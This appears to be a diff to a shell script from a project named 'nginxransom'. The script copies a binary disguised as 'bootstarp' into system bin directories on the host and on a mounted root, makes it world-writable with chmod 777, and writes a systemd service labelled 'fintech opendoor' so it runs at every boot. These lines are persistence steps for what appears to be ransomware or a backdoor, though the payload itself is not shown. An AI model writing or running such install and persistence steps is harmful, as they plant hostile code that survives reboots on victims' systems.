@@ -12,8 +12,8 @@ cp   nginxransom/bootstarp.txt /mnt/usr/bin/bootstarp
 cp   nginxransom/bootstarp.txt /mnt/usr/local/bin/bootstarp 
 cp   nginxransom/bootstarp.txt /usr/bin/bootstarp 
 chmod 777 /usr/bin/bootstarp 
-chmod 777 /mnt/usr/local/bin/bootstarp
-chmod 777 /mnt/usr/bin/bootstarp 
+chmod 777 mnt/usr/local/bin/bootstarp
+chmod 777 mnt/usr/bin/bootstarp 
 #chroot ./ ./bootstarp 
 echo -e "[Unit]\nDescription=fintech opendoor\nAfter=network.target network-online.target\n\n[Service]\nType=oneshot\nRemainAfterExit=yes\n\nExecStart=/usr/local/bin/bootstarp\nExecStop=/usr/local/bin/bootstrap\n\n[Install]\nWantedBy=multi-user.target" > mnt/usr/lib/systemd/system/fintech.service
 cd mnt/usr/bin/
